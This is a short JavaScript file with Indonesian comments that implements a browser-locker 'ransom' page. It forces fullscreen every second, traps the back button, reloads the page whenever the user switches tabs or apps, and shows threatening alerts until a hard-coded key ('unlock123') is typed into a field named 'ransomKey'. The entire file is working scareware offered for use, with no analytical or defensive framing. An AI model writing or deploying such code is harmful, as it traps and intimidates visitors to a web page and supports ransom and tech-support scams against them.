
// Paksa Fullscreen jika keluar
function forceFullscreen() {
    if (document.fullscreenElement === null) {
        document.documentElement.requestFullscreen();
    }
}
setInterval(forceFullscreen, 1000);

// Blokir tombol kembali dan keluar
history.pushState(null, null, location.href);
window.onpopstate = function () {
    history.pushState(null, null, location.href);
    alert("Tidak bisa kembali! Masukkan key untuk keluar!");
};

// Cegah refresh atau pindah tab
document.addEventListener("visibilitychange", function() {
    if (document.hidden) {
        alert("Jangan coba kabur! Masukkan key untuk keluar!");
        location.reload();
    }
});

// Blokir tombol home & recent apps (terbatas di web)
window.addEventListener("blur", function() {
    setTimeout(function() {
        alert("Tidak bisa keluar begitu saja! Masukkan key!");
        location.reload();
    }, 100);
});

// Cek input key untuk bisa keluar
function checkKey() {
    let inputKey = document.getElementById("ransomKey").value;
    if (inputKey === "unlock123") {
        alert("Key benar! Anda bebas!");
        window.onbeforeunload = null;  // Hapus blok keluar
        document.exitFullscreen();  // Keluar dari fullscreen
        history.back();  // Kembali ke halaman sebelumnya
    } else {
        alert("Key salah! Anda tetap terkunci!");
    }
}

// Tambahkan event listener ke tombol unlock
document.addEventListener("DOMContentLoaded", function() {
    let unlockButton = document.getElementById("unlockButton");
    if (unlockButton) unlockButton.addEventListener("click", checkKey);
});
